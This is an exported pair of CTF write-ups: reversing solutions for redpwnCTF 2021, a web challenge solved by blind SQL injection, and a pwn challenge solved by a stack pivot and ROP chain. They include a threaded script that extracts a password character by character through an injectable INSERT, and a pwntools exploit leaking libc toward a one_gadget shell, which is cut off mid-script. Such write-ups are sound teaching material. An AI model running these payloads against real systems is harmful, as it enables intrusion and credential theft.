[{"categories":["ctf"],"content":"Tasks  Rev  bread-making (108 pts) dimensionality (144 pts)   Web  cool (122 pts)     Rev/bread-making (108pts) this prob has a lot of string data, so I just picked the right answer on each situation to get final flag.\nJust analyze binary and submit sentences with right sequence.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  from pwn import *\rcontext.log_level='debug'\rp=remote(\"mc.ax\", 31796)\ra=[\"add flour\",\r\"add yeast\",\r\"add salt\",\r\"add water\",\r\"hide the bowl inside a box\",\r\"wait 3 hours\",\r\"work in the basement\",\r\"preheat the toaster oven\",\r\"set a timer on your phone\",\r\"watch the bread bake\",\r\"pull the tray out with a towel\",\r\"unplug the oven\",\r\"unplug the fire alarm\",\r\"open the window\",\r\"wash the sink\",\r\"clean the counters\",\r\"flush the bread down the toilet\",\r\"get ready to sleep\",\r\"close the window\",\r\"replace the fire alarm\",\r\"brush teeth and go to bed\"\r]\rfor i in range(len(a)):\rprint(i)\rp.recv()\rp.sendline(a[i])\rp.interactive()\r  The flag is flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\nRev/dimensionality (144pts) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  bool __fastcall check(char *a1, __int64 a2, int a3)\r{\rint v3; // er8\r __int64 v4; // rax\r int v5; // er9\r char v6; // al\r char *v7; // rcx\r int v8; // esi\r bool result; // al\r char v10; // r12\r\rv3 = dword_408C * dword_408C * dword_408C; // dword_408C = 11\r if ( v3 \u003e 0 )\r{\rv4 = 1LL;\rwhile ( 1 )\r{\rv5 = v4;\rif ( v3 == v4 )\rbreak;\rif ( *(\u0026unk_207F + ++v4) == 2 )\r{\ra3 = v5;\rbreak;\r}\r}\r}\rv6 = *a1;\rv7 = a1 + 1;\rv8 = dword_408C * dword_408C;\rif ( *a1 )\r{\rwhile ( 1 )\r{\rswitch ( v6 )\r{\rcase 'b':\rv8 = -(dword_408C * dword_408C);\rbreak;\rcase 'd':\rv8 = dword_408C;\rbreak;\rcase 'f':\rv8 = dword_408C * dword_408C;\rbreak;\rcase 'l':\rv8 = -1;\rbreak;\rcase 'r':\rv8 = 1;\rbreak;\rcase 'u':\rv8 = -dword_408C;\rbreak;\rdefault:\rbreak;\r}\ra3 += v8;\rresult = a3 \u003c 0 || a3 \u003e v3;\rif ( result )\rbreak;\rv10 = byte_2080[a3];\rif ( !v10 )\rreturn result;\rv6 = *v7++;\rif ( !v6 )\rgoto LABEL_12;\r}\rresult = 0;\r}\relse\r{\rv10 = byte_2080[a3];\rLABEL_12:\rresult = v10 == 3;\r}\rreturn result;\r}\r  I found a map (in unk_207F) involved 0,1,2,3 digits.\nWhen I analyzed this binary, i found the goal : escape maze with 6 commands from 2 to 3.\n(using f,b,d,u,r,l)\n f → cur+121\nb → cur-121\nd → cur+11\nu → cur-11\nr -\u003e cur+1\nl -\u003e cur-1\n this prob can input command string upto length 29bytes, so I have to find a way that escape efficiently.\nThe player is currently located at 2. It is only possible to go to 1 or 3 instead of 0 through the command, and since it is inefficient to go back the way it has already been done, so using the breadth-first search(BFS) algorithm can reduce the number of cases.\nHere’s my payload and I found 6 answers of this prob in 0.5 sec. one of these answers should print correct flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  from pwn import *\ra=[0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]\rcur=a.index(2)\rqueue=[[cur,[cur]]]\rprint queue\rst=0\ren=1\rwhile st\u003cen:\rif a[queue[st][0]]==3:\rprint str(queue[st][1])\rif 0 \u003c= queue[st][0]+1 \u003c= 1331 and (a[queue[st][0]+1]==1 or a[queue[st][0]+1]==3) and queue[st][0]+1 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]+1)\r#print(queue[st][1])\r queue.append([queue[st][0]+1, temp])\ren+=1\rif 0 \u003c= queue[st][0]-1 \u003c= 1331 and (a[queue[st][0]-1]==1 or a[queue[st][0]-1]==3) and queue[st][0]-1 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]-1)\r#print(queue[st][1])\r queue.append([queue[st][0]-1, temp])\ren+=1\rif 0 \u003c= queue[st][0]+11 \u003c= 1331 and (a[queue[st][0]+11]==1 or a[queue[st][0]+11]==3) and queue[st][0]+11 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]+11)\r#print(queue[st][1])\r queue.append([queue[st][0]+11, temp])\ren+=1\rif 0 \u003c= queue[st][0]-11 \u003c= 1331 and (a[queue[st][0]-11]==1 or a[queue[st][0]-11]==3) and queue[st][0]-11 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]-11)\r#print(queue[st][1])\r queue.append([queue[st][0]-11, temp])\ren+=1\rif 0 \u003c= queue[st][0]+121 \u003c= 1331 and (a[queue[st][0]+121]==1 or a[queue[st][0]+121]==3) and queue[st][0]+121 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]+121)\r#print(queue[st][1])\r queue.append([queue[st][0]+121, temp])\ren+=1\rif 0 \u003c= queue[st][0]-121 \u003c= 1331 and (a[queue[st][0]-121]==1 or a[queue[st][0]-121]==3) and queue[st][0]-121 not in queue[st][1]:\rif len(queue[st][1])==30:\rpass\relse:\rtemp=queue[st][1][:]\rtemp.append(queue[st][0]-121)\r#print(queue[st][1])\r queue.append([queue[st][0]-121, temp])\ren+=1\rst+=1\r#print st,en\r   the third answer is correct input to get flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #a=[84, 205, 206, 207, 328, 449, 448, 447, 446, 445, 566, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]\r #a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 688, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]\r a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 700, 711, 710, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]\r#a=[84, 205, 204, 203, 214, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]\r #a=[84, 205, 204, 203, 192, 181, 180, 179, 168, 157, 278, 399, 520, 641, 642, 643, 764, 885, 886, 887, 898, 909, 920, 931, 932, 933, 1054, 1175, 1296]\r #a=[84, 205, 216, 227, 226, 225, 224, 223, 344, 465, 466, 467, 588, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296]\r result=\"\"\rfor i in range(1,len(a)):\rif a[i]-a[i-1]==121:\rresult+='f'\rif a[i]-a[i-1]==-121:\rresult+='b'\rif a[i]-a[i-1]==11:\rresult+='d'\rif a[i]-a[i-1]==-11:\rresult+='u'\rif a[i]-a[i-1]==1:\rresult+='r'\rif a[i]-a[i-1]==-1:\rresult+='l'\rprint result\r# correct input is frrffllffddllffrrffuubbrrfff\r   ❯ ./chall frrffllffddllffrrffuubbrrfff\r:)\rflag{star_/_so_bright_/_car_/_site_-ppsu}\rThe flag is flag{star_/_so_bright_/_car_/_site_-ppsu}\nWeb/cool (122pts) here are some initial parts and vulnerable parts of app.py.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  def create_user(username, password):\rif any(c not in allowed_characters for c in username):\rreturn (False, 'Alphanumeric usernames only, please.')\rif len(username) \u003c 1:\rreturn (False, 'Username is too short.')\rif len(password) \u003e 50:\rreturn (False, 'Password is too long.')\rother_users = execute(\rf'SELECT * FROM users WHERE username=\\'{username}\\';'\r)\rif len(other_users) \u003e 0:\rreturn (False, 'Username taken.')\rexecute(\r'INSERT INTO users (username, password)'\rf'VALUES (\\'{username}\\', \\'{password}\\');'\r)\rreturn (True, '')\r@app.route('/register', methods=['GET', 'POST'])\rdef register():\rmessage = ''\rif request.method == 'POST':\rsuccess, message = create_user(\rrequest.form['username'],\rrequest.form['password']\r)\rif success:\rsession['username'] = request.form['username']\rreturn redirect('/message')\rreturn render_template_string('''\r\u003clink rel=\"stylesheet\" href=\"/static/style.css\" /\u003e\r\u003cdiv class=\"container\"\u003e\r\u003cp\u003eRegister!\u003c/p\u003e\r\u003cform method=\"POST\"\u003e\r\u003clabel for=\"username\"\u003eUsername\u003c/label\u003e\r\u003cinput type=\"text\" name=\"username\" /\u003e\r\u003clabel for=\"password\"\u003ePassword\u003c/label\u003e\r\u003cinput type=\"password\" name=\"password\" /\u003e\r\u003cinput type=\"submit\" value=\"Register\" /\u003e\r\u003c/form\u003e\r\u003cp\u003e{{ error }}\u003c/p\u003e\r\u003c/div\u003e\r''', error=message)\r@app.route('/message')\rdef message():\rif 'username' not in session:\rreturn redirect('/')\rif session['username'] == 'ginkoid':\rreturn send_file(\r'flag.mp3',\rattachment_filename='flag-at-end-of-file.mp3'\r)\rreturn '''\r\u003clink rel=\"stylesheet\" href=\"/static/style.css\" /\u003e\r\u003cdiv class=\"container\"\u003e\r\u003cp\u003eYou are logged in!\u003c/p\u003e\r\u003cp\u003eUnfortunately, Aaron's message is for cool people only.\u003c/p\u003e\r\u003cp\u003e(like ginkoid)\u003c/p\u003e\r\u003ca href=\"/logout\"\u003eLog out\u003c/a\u003e\r\u003c/div\u003e\r'''\r  If we submit register form, app.py call create_user function.\nthis prob doesn’t filter password (just filter username using allowed_characters)\n1 2 3  allowed_characters = set(\r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'\r)\r  the goal is to find ginkoid’s password, so I used blind sql injection attack vector: execute(insert into username, password).\nhere is my payload:\n username : any\npassword : `{each char}‘=substr((select password from users),{offset},1)\n subquery (select password from users) return first user(ginkoid)‘s password. So, this method can verify each password char with 1 OR 0 (bool) result. Only have to do is login each username and find user that password is 1, and combine them.\npayload source code I use thread because it tooks a long time.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  from threading import Thread\rimport requests\rimport string\rURL=\"https://cool.mc.ax/register\"\rURL2=\"https://cool.mc.ax/\"\rallow='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'\r#allow=string.printable\r def threading_func(i,j):\rdata={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':allow[j]+'\\'=substr((select password from users),'+str(i+1)+',1))-- '}\rprint(data)\rr=requests.post(URL, data=data)\r#print r.text\r def threading_func2(i,j):\rglobal result\rdata={'username':'cde'+'a'*i+'asdf'+allow[j], 'password':\"0\"}\r#print data\r r=requests.post(URL2, data=data)\r#print(r.text)\r if \"Incorrect username or password.\" in r.text:\rprint(str(i), allow[j], \"is 1\")\rfor x in range(32):\rfor y in range(len(allow)):\rth=Thread(target=threading_func, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))\rth.start()\rfor x in range(32):\rfor y in range(len(allow)):\r#print(x,y)\r th=Thread(target=threading_func2, name=\"[\"+str(x)+\" \"+allow[y]+\"]\", args=(x,y,))\rth.start()\r  finally I found password of ginkoid: k4Wm3qCKKK7kuLBVF3XFyo2kGCSj4ESe\nAnd I received flag in flag-at-end-of-file.mp3. just execute command tail and get flag!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  /mnt/c/Users/bww96/Downloads ❯ tail flag-at-end-of-file.mp3 Uj(΁!*-IjZuaɤZ'L\rt1r}^:G̑klS\\4QD\\tO˻9T%oi03#^)ҝQFk?+zY\u003e-=\u0026T0)۪FP]\r!}?LY`4Or~eClRD,wdbeVlH`lU\u003c4vLa3WNU'8\\4ieKDGƨtd 8eBQ\u003cc$TND5]y+\u0026|ꯜ@C5V\u003cNu*7UFD2\u003ch\re?TMq8zgh\rпg\u003ceZ(#@4\rH~͈B܍5f1\r9o\r{K14-v6(n|MmQ;f3\u0026*#ekFNܾEŪ��?2 уP@d qA-^W.REW?dYk\r\u003eJ\r%{\r1\r\\Q\"B(q6CA3gV{?7UJO71,\u003c$ʙ|F@T2m*ez\\dl1u+\u0026Uȧg!!;,/)f:x$VD$)*38\u003eƛ\u003cvbeI [6Y(5Vt7B sd)ZYn wLAMEUUHDH#@DE*Bb��f,L\"c0Q!1ƴ7ԃ8!QF*%QD1TU~\rMI04UUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUU\rUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUU UUUUUU(Dk4UUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUUUUU\rUUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUdBE@@\r4UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUflag{44r0n_s4ys_s08r137y_1s_c00l}\r  The flag is flag{44r0n_s4ys_s08r137y_1s_c00l}\n","description":"","tags":["web","reversing","algorithm"],"title":"redpwnCTF rev-web write-up","uri":"/posts/redpwn_2021_rev_web/"},{"categories":["ctf"],"content":"Tasks  Pwn  Tourniquet (249pts)   Rev  Mission Impossible (246pts)     Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.\nBut, it has a constraint:\n fgets(size, buf, stdin) set arguments from stdin to size.. so I can’t call containing stdin. Should bruteforce(1/16) to get correct stack pointer. Must do stack pivot until I find a writable memory after leaking libc.  So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.\nThe following process is my idea to get shell..\n Overwrite one byte of SFP to \\x00 using fgets() function’s \\n + \\x00. Bruteforce correct position of RBP. and ROP with puts to get libc. stack pivot to main(mov rbp, rsp) twice (my solution in competition).\n(※ To go __start is another solution to get many memories that I can use for next ROP.) find one_gadget with strings and objdump command because gem one_gadget could’t get shell on remote. Get Shell.  Here is my payload.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  from pwn import * context.log_level='debug' #context.terminal=['tmux','splitw','-h'] e=ELF(\"./tourniquet\") libc=ELF(\"./libc.so.6\") #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym['main'] puts_got=e.got['puts'] puts_plt=e.plt['puts'] setvbuf_got=e.got['setvbuf'] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt['fgets'] pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+\"\\x00\"*7 while True: try: p=remote(\"remote2.thcon.party\", 10901) #p=process(\"./tourniquet\") p.sendlineafter(\"haha i'm unhackable right ?\\n\",pay) leak=p.recvuntil(\"\\x7f\",timeout=1).ljust(8,'\\x00') if '\\x7f' not in leak: p.close() continue base=u64(leak)-libc.sym['setvbuf'] rdx=base+rdx_offset stdin=base+libc.sym['_IO_2_1_stdin_'] one_gadget=base+0xe5418 print hex(base) break 